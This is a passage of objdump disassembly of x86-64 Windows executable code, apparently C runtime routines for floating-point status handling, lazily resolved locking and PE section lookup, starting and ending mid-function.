   14000a956:	48 8b 03             	mov    (%rbx),%rax
   14000a959:	48 c1 e8 0a          	shr    $0xa,%rax
   14000a95d:	c1 e0 02             	shl    $0x2,%eax
   14000a960:	f7 d0                	not    %eax
   14000a962:	33 41 08             	xor    0x8(%rcx),%eax
   14000a965:	83 e0 04             	and    $0x4,%eax
   14000a968:	31 41 08             	xor    %eax,0x8(%rcx)
   14000a96b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a96f:	48 8b 03             	mov    (%rbx),%rax
   14000a972:	48 c1 e8 0b          	shr    $0xb,%rax
   14000a976:	03 c0                	add    %eax,%eax
   14000a978:	f7 d0                	not    %eax
   14000a97a:	33 41 08             	xor    0x8(%rcx),%eax
   14000a97d:	83 e0 02             	and    $0x2,%eax
   14000a980:	31 41 08             	xor    %eax,0x8(%rcx)
   14000a983:	8b 03                	mov    (%rbx),%eax
   14000a985:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a989:	48 c1 e8 0c          	shr    $0xc,%rax
   14000a98d:	f7 d0                	not    %eax
   14000a98f:	33 41 08             	xor    0x8(%rcx),%eax
   14000a992:	83 e0 01             	and    $0x1,%eax
   14000a995:	31 41 08             	xor    %eax,0x8(%rcx)
   14000a998:	e8 df 02 00 00       	call   0x14000ac7c
   14000a99d:	48 8b d0             	mov    %rax,%rdx
   14000a9a0:	a8 01                	test   $0x1,%al
   14000a9a2:	74 08                	je     0x14000a9ac
   14000a9a4:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a9a8:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000a9ac:	a8 04                	test   $0x4,%al
   14000a9ae:	74 08                	je     0x14000a9b8
   14000a9b0:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a9b4:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000a9b8:	a8 08                	test   $0x8,%al
   14000a9ba:	74 08                	je     0x14000a9c4
   14000a9bc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a9c0:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000a9c4:	f6 c2 10             	test   $0x10,%dl
   14000a9c7:	74 08                	je     0x14000a9d1
   14000a9c9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a9cd:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000a9d1:	f6 c2 20             	test   $0x20,%dl
   14000a9d4:	74 08                	je     0x14000a9de
   14000a9d6:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a9da:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000a9de:	8b 03                	mov    (%rbx),%eax
   14000a9e0:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000a9e5:	48 23 c1             	and    %rcx,%rax
   14000a9e8:	74 3e                	je     0x14000aa28
   14000a9ea:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000a9f0:	74 26                	je     0x14000aa18
   14000a9f2:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000a9f8:	74 0e                	je     0x14000aa08
   14000a9fa:	48 3b c1             	cmp    %rcx,%rax
   14000a9fd:	75 30                	jne    0x14000aa2f
   14000a9ff:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa03:	83 08 03             	orl    $0x3,(%rax)
   14000aa06:	eb 27                	jmp    0x14000aa2f
   14000aa08:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa0c:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000aa0f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa13:	83 08 02             	orl    $0x2,(%rax)
   14000aa16:	eb 17                	jmp    0x14000aa2f
   14000aa18:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa1c:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000aa1f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa23:	83 08 01             	orl    $0x1,(%rax)
   14000aa26:	eb 07                	jmp    0x14000aa2f
   14000aa28:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa2c:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000aa2f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa33:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000aa39:	c1 e6 05             	shl    $0x5,%esi
   14000aa3c:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000aa42:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa46:	09 30                	or     %esi,(%rax)
   14000aa48:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa4c:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000aa50:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000aa54:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000aa58:	74 33                	je     0x14000aa8d
   14000aa5a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa5e:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000aa63:	21 50 20             	and    %edx,0x20(%rax)
   14000aa66:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000aa6a:	8b 08                	mov    (%rax),%ecx
   14000aa6c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa70:	89 48 10             	mov    %ecx,0x10(%rax)
   14000aa73:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa77:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000aa7b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa7f:	21 50 60             	and    %edx,0x60(%rax)
   14000aa82:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aa86:	8b 0e                	mov    (%rsi),%ecx
   14000aa88:	89 48 50             	mov    %ecx,0x50(%rax)
   14000aa8b:	eb 48                	jmp    0x14000aad5
   14000aa8d:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000aa91:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000aa97:	8b 41 20             	mov    0x20(%rcx),%eax
   14000aa9a:	41 23 c0             	and    %r8d,%eax
   14000aa9d:	83 c8 02             	or     $0x2,%eax
   14000aaa0:	89 41 20             	mov    %eax,0x20(%rcx)
   14000aaa3:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000aaa7:	48 8b 08             	mov    (%rax),%rcx
   14000aaaa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aaae:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000aab2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aab6:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000aaba:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000aabe:	8b 42 60             	mov    0x60(%rdx),%eax
   14000aac1:	41 23 c0             	and    %r8d,%eax
   14000aac4:	83 c8 02             	or     $0x2,%eax
   14000aac7:	89 42 60             	mov    %eax,0x60(%rdx)
   14000aaca:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000aace:	48 8b 16             	mov    (%rsi),%rdx
   14000aad1:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000aad5:	e8 e6 00 00 00       	call   0x14000abc0
   14000aada:	33 d2                	xor    %edx,%edx
   14000aadc:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000aae0:	8b cf                	mov    %edi,%ecx
   14000aae2:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000aae6:	ff 15 14 16 00 00    	call   *0x1614(%rip)        # 0x14000c100
   14000aaec:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000aaf0:	f6 41 08 10          	testb  $0x10,0x8(%rcx)
   14000aaf4:	74 05                	je     0x14000aafb
   14000aaf6:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000aafb:	f6 41 08 08          	testb  $0x8,0x8(%rcx)
   14000aaff:	74 05                	je     0x14000ab06
   14000ab01:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000ab06:	f6 41 08 04          	testb  $0x4,0x8(%rcx)
   14000ab0a:	74 05                	je     0x14000ab11
   14000ab0c:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000ab11:	f6 41 08 02          	testb  $0x2,0x8(%rcx)
   14000ab15:	74 05                	je     0x14000ab1c
   14000ab17:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000ab1c:	f6 41 08 01          	testb  $0x1,0x8(%rcx)
   14000ab20:	74 05                	je     0x14000ab27
   14000ab22:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000ab27:	8b 01                	mov    (%rcx),%eax
   14000ab29:	83 e0 03             	and    $0x3,%eax
   14000ab2c:	74 30                	je     0x14000ab5e
   14000ab2e:	83 e8 01             	sub    $0x1,%eax
   14000ab31:	74 1f                	je     0x14000ab52
   14000ab33:	83 e8 01             	sub    $0x1,%eax
   14000ab36:	74 0e                	je     0x14000ab46
   14000ab38:	83 f8 01             	cmp    $0x1,%eax
   14000ab3b:	75 28                	jne    0x14000ab65
   14000ab3d:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000ab44:	eb 1f                	jmp    0x14000ab65
   14000ab46:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000ab4b:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000ab50:	eb 13                	jmp    0x14000ab65
   14000ab52:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000ab57:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000ab5c:	eb 07                	jmp    0x14000ab65
   14000ab5e:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000ab65:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000ab69:	74 07                	je     0x14000ab72
   14000ab6b:	8b 41 50             	mov    0x50(%rcx),%eax
   14000ab6e:	89 06                	mov    %eax,(%rsi)
   14000ab70:	eb 07                	jmp    0x14000ab79
   14000ab72:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000ab76:	48 89 06             	mov    %rax,(%rsi)
   14000ab79:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000ab7e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000ab83:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000ab88:	48 83 c4 20          	add    $0x20,%rsp
   14000ab8c:	5d                   	pop    %rbp
   14000ab8d:	c3                   	ret
   14000ab8e:	90                   	nop
   14000ab8f:	90                   	nop
   14000ab90:	48 83 ec 28          	sub    $0x28,%rsp
   14000ab94:	83 f9 01             	cmp    $0x1,%ecx
   14000ab97:	74 15                	je     0x14000abae
   14000ab99:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000ab9c:	83 f8 01             	cmp    $0x1,%eax
   14000ab9f:	77 18                	ja     0x14000abb9
   14000aba1:	e8 4a a1 ff ff       	call   0x140004cf0
   14000aba6:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000abac:	eb 0b                	jmp    0x14000abb9
   14000abae:	e8 3d a1 ff ff       	call   0x140004cf0
   14000abb3:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000abb9:	48 83 c4 28          	add    $0x28,%rsp
   14000abbd:	c3                   	ret
   14000abbe:	90                   	nop
   14000abbf:	90                   	nop
   14000abc0:	53                   	push   %rbx
   14000abc1:	48 83 ec 20          	sub    $0x20,%rsp
   14000abc5:	e8 66 fc ff ff       	call   0x14000a830
   14000abca:	8b d8                	mov    %eax,%ebx
   14000abcc:	83 e3 3f             	and    $0x3f,%ebx
   14000abcf:	e8 78 fc ff ff       	call   0x14000a84c
   14000abd4:	8b c3                	mov    %ebx,%eax
   14000abd6:	48 83 c4 20          	add    $0x20,%rsp
   14000abda:	5b                   	pop    %rbx
   14000abdb:	c3                   	ret
   14000abdc:	90                   	nop
   14000abdd:	90                   	nop
   14000abde:	90                   	nop
   14000abdf:	90                   	nop
   14000abe0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000abe5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000abea:	57                   	push   %rdi
   14000abeb:	48 83 ec 20          	sub    $0x20,%rsp
   14000abef:	48 8b da             	mov    %rdx,%rbx
   14000abf2:	48 8b f9             	mov    %rcx,%rdi
   14000abf5:	e8 36 fc ff ff       	call   0x14000a830
   14000abfa:	8b f0                	mov    %eax,%esi
   14000abfc:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000ac00:	8b cb                	mov    %ebx,%ecx
   14000ac02:	f7 d1                	not    %ecx
   14000ac04:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000ac0a:	23 c8                	and    %eax,%ecx
   14000ac0c:	23 fb                	and    %ebx,%edi
   14000ac0e:	0b cf                	or     %edi,%ecx
   14000ac10:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000ac14:	80 3d 05 ad 00 00 00 	cmpb   $0x0,0xad05(%rip)        # 0x140015920
   14000ac1b:	74 25                	je     0x14000ac42
   14000ac1d:	f6 c1 40             	test   $0x40,%cl
   14000ac20:	74 20                	je     0x14000ac42
   14000ac22:	e8 19 fc ff ff       	call   0x14000a840
   14000ac27:	eb 17                	jmp    0x14000ac40
   14000ac29:	c6 05 f0 ac 00 00 00 	movb   $0x0,0xacf0(%rip)        # 0x140015920
   14000ac30:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000ac34:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000ac37:	e8 04 fc ff ff       	call   0x14000a840
   14000ac3c:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000ac40:	eb 08                	jmp    0x14000ac4a
   14000ac42:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000ac45:	e8 f6 fb ff ff       	call   0x14000a840
   14000ac4a:	8b c6                	mov    %esi,%eax
   14000ac4c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000ac51:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000ac56:	48 83 c4 20          	add    $0x20,%rsp
   14000ac5a:	5f                   	pop    %rdi
   14000ac5b:	c3                   	ret
   14000ac5c:	53                   	push   %rbx
   14000ac5d:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac61:	48 8b d9             	mov    %rcx,%rbx
   14000ac64:	e8 c7 fb ff ff       	call   0x14000a830
   14000ac69:	83 e3 3f             	and    $0x3f,%ebx
   14000ac6c:	0b c3                	or     %ebx,%eax
   14000ac6e:	8b c8                	mov    %eax,%ecx
   14000ac70:	48 83 c4 20          	add    $0x20,%rsp
   14000ac74:	5b                   	pop    %rbx
   14000ac75:	e9 c6 fb ff ff       	jmp    0x14000a840
   14000ac7a:	90                   	nop
   14000ac7b:	90                   	nop
   14000ac7c:	48 83 ec 28          	sub    $0x28,%rsp
   14000ac80:	e8 ab fb ff ff       	call   0x14000a830
   14000ac85:	83 e0 3f             	and    $0x3f,%eax
   14000ac88:	48 83 c4 28          	add    $0x28,%rsp
   14000ac8c:	c3                   	ret
   14000ac8d:	90                   	nop
   14000ac8e:	90                   	nop
   14000ac8f:	90                   	nop
   14000ac90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ac95:	57                   	push   %rdi
   14000ac96:	48 83 ec 20          	sub    $0x20,%rsp
   14000ac9a:	f7 05 fc 7c 00 00 00 	testl  $0x1000,0x7cfc(%rip)        # 0x1400129a0
   14000aca1:	10 00 00 
   14000aca4:	0f 84 94 00 00 00    	je     0x14000ad3e
   14000acaa:	e8 9d 00 00 00       	call   0x14000ad4c
   14000acaf:	bf 01 00 00 00       	mov    $0x1,%edi
   14000acb4:	84 c0                	test   %al,%al
   14000acb6:	74 1d                	je     0x14000acd5
   14000acb8:	48 8b 1d c1 bd 00 00 	mov    0xbdc1(%rip),%rbx        # 0x140016a80
   14000acbf:	48 8b cb             	mov    %rbx,%rcx
   14000acc2:	ff 15 c0 15 00 00    	call   *0x15c0(%rip)        # 0x14000c288
   14000acc8:	48 8d 0d c1 bd 00 00 	lea    0xbdc1(%rip),%rcx        # 0x140016a90
   14000accf:	ff d3                	call   *%rbx
   14000acd1:	eb 19                	jmp    0x14000acec
   14000acd3:	f3 90                	pause
   14000acd5:	48 8b 05 b4 bd 00 00 	mov    0xbdb4(%rip),%rax        # 0x140016a90
   14000acdc:	48 85 c0             	test   %rax,%rax
   14000acdf:	75 f2                	jne    0x14000acd3
   14000ace1:	f0 48 0f b1 3d a6 bd 	lock cmpxchg %rdi,0xbda6(%rip)        # 0x140016a90
   14000ace8:	00 00 
   14000acea:	75 e9                	jne    0x14000acd5
   14000acec:	8b 05 a6 bd 00 00    	mov    0xbda6(%rip),%eax        # 0x140016a98
   14000acf2:	03 c7                	add    %edi,%eax
   14000acf4:	89 05 9e bd 00 00    	mov    %eax,0xbd9e(%rip)        # 0x140016a98
   14000acfa:	3b c7                	cmp    %edi,%eax
   14000acfc:	75 11                	jne    0x14000ad0f
   14000acfe:	48 8d 15 97 bd 00 00 	lea    0xbd97(%rip),%rdx        # 0x140016a9c
   14000ad05:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000ad0a:	e8 09 02 00 00       	call   0x14000af18
   14000ad0f:	e8 38 00 00 00       	call   0x14000ad4c
   14000ad14:	84 c0                	test   %al,%al
   14000ad16:	74 1b                	je     0x14000ad33
   14000ad18:	48 8b 1d 69 bd 00 00 	mov    0xbd69(%rip),%rbx        # 0x140016a88
   14000ad1f:	48 8b cb             	mov    %rbx,%rcx
   14000ad22:	ff 15 60 15 00 00    	call   *0x1560(%rip)        # 0x14000c288
   14000ad28:	48 8d 0d 61 bd 00 00 	lea    0xbd61(%rip),%rcx        # 0x140016a90
   14000ad2f:	ff d3                	call   *%rbx
   14000ad31:	eb 0b                	jmp    0x14000ad3e
   14000ad33:	48 c7 05 52 bd 00 00 	movq   $0x0,0xbd52(%rip)        # 0x140016a90
   14000ad3a:	00 00 00 00 
   14000ad3e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ad43:	48 83 c4 20          	add    $0x20,%rsp
   14000ad47:	5f                   	pop    %rdi
   14000ad48:	c3                   	ret
   14000ad49:	90                   	nop
   14000ad4a:	90                   	nop
   14000ad4b:	90                   	nop
   14000ad4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ad51:	57                   	push   %rdi
   14000ad52:	48 83 ec 20          	sub    $0x20,%rsp
   14000ad56:	48 8b 05 1b bd 00 00 	mov    0xbd1b(%rip),%rax        # 0x140016a78
   14000ad5d:	bf 01 00 00 00       	mov    $0x1,%edi
   14000ad62:	48 3b c7             	cmp    %rdi,%rax
   14000ad65:	75 04                	jne    0x14000ad6b
   14000ad67:	32 c0                	xor    %al,%al
   14000ad69:	eb 71                	jmp    0x14000addc
   14000ad6b:	48 85 c0             	test   %rax,%rax
   14000ad6e:	75 69                	jne    0x14000add9
   14000ad70:	48 8d 0d 41 7b 00 00 	lea    0x7b41(%rip),%rcx        # 0x1400128b8
   14000ad77:	ff 15 63 13 00 00    	call   *0x1363(%rip)        # 0x14000c0e0
   14000ad7d:	48 8b d8             	mov    %rax,%rbx
   14000ad80:	48 85 c0             	test   %rax,%rax
   14000ad83:	75 05                	jne    0x14000ad8a
   14000ad85:	48 8b df             	mov    %rdi,%rbx
   14000ad88:	eb 38                	jmp    0x14000adc2
   14000ad8a:	48 8d 15 47 7b 00 00 	lea    0x7b47(%rip),%rdx        # 0x1400128d8
   14000ad91:	48 8b c8             	mov    %rax,%rcx
   14000ad94:	ff 15 86 12 00 00    	call   *0x1286(%rip)        # 0x14000c020
   14000ad9a:	48 85 c0             	test   %rax,%rax
   14000ad9d:	74 e6                	je     0x14000ad85
   14000ad9f:	48 8d 15 4a 7b 00 00 	lea    0x7b4a(%rip),%rdx        # 0x1400128f0
   14000ada6:	48 89 05 d3 bc 00 00 	mov    %rax,0xbcd3(%rip)        # 0x140016a80
   14000adad:	48 8b cb             	mov    %rbx,%rcx
   14000adb0:	ff 15 6a 12 00 00    	call   *0x126a(%rip)        # 0x14000c020
   14000adb6:	48 85 c0             	test   %rax,%rax
   14000adb9:	74 ca                	je     0x14000ad85
   14000adbb:	48 89 05 c6 bc 00 00 	mov    %rax,0xbcc6(%rip)        # 0x140016a88
   14000adc2:	33 c0                	xor    %eax,%eax
   14000adc4:	f0 48 0f b1 1d ab bc 	lock cmpxchg %rbx,0xbcab(%rip)        # 0x140016a78
   14000adcb:	00 00 
   14000adcd:	75 05                	jne    0x14000add4
   14000adcf:	48 3b df             	cmp    %rdi,%rbx
   14000add2:	74 93                	je     0x14000ad67
   14000add4:	48 3b c7             	cmp    %rdi,%rax
   14000add7:	74 8e                	je     0x14000ad67
   14000add9:	40 8a c7             	mov    %dil,%al
   14000addc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ade1:	48 83 c4 20          	add    $0x20,%rsp
   14000ade5:	5f                   	pop    %rdi
   14000ade6:	c3                   	ret
   14000ade7:	90                   	nop
   14000ade8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aded:	57                   	push   %rdi
   14000adee:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000adf5:	48 8b fa             	mov    %rdx,%rdi
   14000adf8:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   14000adfe:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000ae03:	48 8b d9             	mov    %rcx,%rbx
   14000ae06:	ff 15 64 14 00 00    	call   *0x1464(%rip)        # 0x14000c270
   14000ae0c:	48 85 c0             	test   %rax,%rax
   14000ae0f:	75 05                	jne    0x14000ae16
   14000ae11:	8d 48 19             	lea    0x19(%rax),%ecx
   14000ae14:	cd 29                	int    $0x29
   14000ae16:	f6 44 24 44 44       	testb  $0x44,0x44(%rsp)
   14000ae1b:	74 51                	je     0x14000ae6e
   14000ae1d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000ae22:	ff 15 38 14 00 00    	call   *0x1438(%rip)        # 0x14000c260
   14000ae28:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   14000ae2d:	33 d2                	xor    %edx,%edx
   14000ae2f:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   14000ae33:	8b c8                	mov    %eax,%ecx
   14000ae35:	23 c3                	and    %ebx,%eax
   14000ae37:	23 cf                	and    %edi,%ecx
   14000ae39:	03 c1                	add    %ecx,%eax
   14000ae3b:	48 ff c8             	dec    %rax
   14000ae3e:	49 03 c0             	add    %r8,%rax
   14000ae41:	49 f7 f0             	div    %r8
   14000ae44:	33 d2                	xor    %edx,%edx
   14000ae46:	48 8b c8             	mov    %rax,%rcx
   14000ae49:	48 8b c7             	mov    %rdi,%rax
   14000ae4c:	49 f7 f0             	div    %r8
   14000ae4f:	03 c8                	add    %eax,%ecx
   14000ae51:	49 8d 40 ff          	lea    -0x1(%r8),%rax
   14000ae55:	48 f7 d0             	not    %rax
   14000ae58:	8b d1                	mov    %ecx,%edx
   14000ae5a:	48 23 c3             	and    %rbx,%rax
   14000ae5d:	85 c9                	test   %ecx,%ecx
   14000ae5f:	74 0d                	je     0x14000ae6e
   14000ae61:	f0 83 08 00          	lock orl $0x0,(%rax)
   14000ae65:	49 03 c0             	add    %r8,%rax
   14000ae68:	48 83 ea 01          	sub    $0x1,%rdx
   14000ae6c:	75 f3                	jne    0x14000ae61
   14000ae6e:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   14000ae75:	00 
   14000ae76:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000ae7d:	5f                   	pop    %rdi
   14000ae7e:	c3                   	ret
   14000ae7f:	90                   	nop
   14000ae80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ae85:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000ae8a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000ae8f:	4c 63 05 a6 51 ff ff 	movslq -0xae5a(%rip),%r8        # 0x14000003c
   14000ae96:	48 8d 35 63 51 ff ff 	lea    -0xae9d(%rip),%rsi        # 0x140000000
   14000ae9d:	4c 03 c6             	add    %rsi,%r8
   14000aea0:	48 8b da             	mov    %rdx,%rbx
   14000aea3:	48 8b f9             	mov    %rcx,%rdi
   14000aea6:	41 83 b8 84 00 00 00 	cmpl   $0xd,0x84(%r8)
   14000aead:	0d 
   14000aeae:	76 47                	jbe    0x14000aef7
   14000aeb0:	41 8b 88 f0 00 00 00 	mov    0xf0(%r8),%ecx
   14000aeb7:	45 33 c9             	xor    %r9d,%r9d
   14000aeba:	85 c9                	test   %ecx,%ecx
   14000aebc:	74 39                	je     0x14000aef7
   14000aebe:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000aec3:	49 8d 50 18          	lea    0x18(%r8),%rdx
   14000aec7:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000aecc:	48 03 d0             	add    %rax,%rdx
   14000aecf:	44 8b 54 31 0c       	mov    0xc(%rcx,%rsi,1),%r10d
   14000aed4:	45 85 db             	test   %r11d,%r11d
   14000aed7:	74 1e                	je     0x14000aef7
   14000aed9:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   14000aedc:	44 3b d1             	cmp    %ecx,%r10d
   14000aedf:	72 0a                	jb     0x14000aeeb
   14000aee1:	8b 42 08             	mov    0x8(%rdx),%eax
   14000aee4:	03 c8                	add    %eax,%ecx
   14000aee6:	44 3b d1             	cmp    %ecx,%r10d
   14000aee9:	72 1e                	jb     0x14000af09
   14000aeeb:	41 ff c1             	inc    %r9d
   14000aeee:	48 83 c2 28          	add    $0x28,%rdx
   14000aef2:	45 3b cb             	cmp    %r11d,%r9d
   14000aef5:	72 e2                	jb     0x14000aed9
   14000aef7:	33 c0                	xor    %eax,%eax
   14000aef9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000aefe:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   14000af03:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   14000af08:	c3                   	ret
   14000af09:	89 07                	mov    %eax,(%rdi)
   14000af0b:	8b 42 24             	mov    0x24(%rdx),%eax
   14000af0e:	89 03                	mov    %eax,(%rbx)
   14000af10:	8b 42 0c             	mov    0xc(%rdx),%eax
   14000af13:	48 03 c6             	add    %rsi,%rax
   14000af16:	eb e1                	jmp    0x14000aef9
   14000af18:	48 8b c4             	mov    %rsp,%rax
   14000af1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000af1f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000af23:	57                   	push   %rdi
   14000af24:	48 83 ec 20          	sub    $0x20,%rsp
   14000af28:	48 8b fa             	mov    %rdx,%rdi
   14000af2b:	8b f1                	mov    %ecx,%esi
   14000af2d:	48 8d 50 20          	lea    0x20(%rax),%rdx
   14000af31:	48 8d 48 18          	lea    0x18(%rax),%rcx
   14000af35:	e8 46 ff ff ff       	call   0x14000ae80
   14000af3a:	48 8b d8             	mov    %rax,%rbx
   14000af3d:	48 85 c0             	test   %rax,%rax
   14000af40:	75 08                	jne    0x14000af4a
   14000af42:	c7 07 04 00 00 00    	movl   $0x4,(%rdi)
   14000af48:	eb 4c                	jmp    0x14000af96
   14000af4a:	83 3d 4f bb 00 00 00 	cmpl   $0x0,0xbb4f(%rip)        # 0x140016aa0
   14000af51:	75 27                	jne    0x14000af7a
   14000af53:	f7 44 24 48 00 00 00 	testl  $0x80000000,0x48(%rsp)
   14000af5a:	80 
   14000af5b:	c7 05 3b bb 00 00 01 	movl   $0x1,0xbb3b(%rip)        # 0x140016aa0
   14000af62:	00 00 00 
   14000af65:	75 07                	jne    0x14000af6e
   14000af67:	b9 19 00 00 00       	mov    $0x19,%ecx
   14000af6c:	cd 29                	int    $0x29
   14000af6e:	8b 54 24 40          	mov    0x40(%rsp),%edx
   14000af72:	48 8b c8             	mov    %rax,%rcx
   14000af75:	e8 6e fe ff ff       	call   0x14000ade8
   14000af7a:	8b 54 24 40          	mov    0x40(%rsp),%edx
   14000af7e:	4c 8b cf             	mov    %rdi,%r9
   14000af81:	44 8b c6             	mov    %esi,%r8d
   14000af84:	48 8b cb             	mov    %rbx,%rcx
   14000af87:	ff 15 db 12 00 00    	call   *0x12db(%rip)        # 0x14000c268
   14000af8d:	85 c0                	test   %eax,%eax
   14000af8f:	75 05                	jne    0x14000af96
   14000af91:	8d 48 19             	lea    0x19(%rax),%ecx
   14000af94:	cd 29                	int    $0x29
   14000af96:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000af9b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000afa0:	48 83 c4 20          	add    $0x20,%rsp
   14000afa4:	5f                   	pop    %rdi
   14000afa5:	c3                   	ret
   14000afa6:	90                   	nop
   14000afa7:	90                   	nop
   14000afa8:	53                   	push   %rbx
   14000afa9:	48 83 ec 20          	sub    $0x20,%rsp
   14000afad:	f7 05 e9 79 00 00 00 	testl  $0x1000,0x79e9(%rip)        # 0x1400129a0
   14000afb4:	10 00 00 
   14000afb7:	0f 84 88 00 00 00    	je     0x14000b045
   14000afbd:	e8 8a fd ff ff       	call   0x14000ad4c
   14000afc2:	84 c0                	test   %al,%al
   14000afc4:	74 1d                	je     0x14000afe3
   14000afc6:	48 8b 1d b3 ba 00 00 	mov    0xbab3(%rip),%rbx        # 0x140016a80
   14000afcd:	48 8b cb             	mov    %rbx,%rcx
   14000afd0:	ff 15 b2 12 00 00    	call   *0x12b2(%rip)        # 0x14000c288
   14000afd6:	48 8d 0d b3 ba 00 00 	lea    0xbab3(%rip),%rcx        # 0x140016a90
   14000afdd:	ff d3                	call   *%rbx
   14000afdf:	eb 1c                	jmp    0x14000affd
   14000afe1:	f3 90                	pause
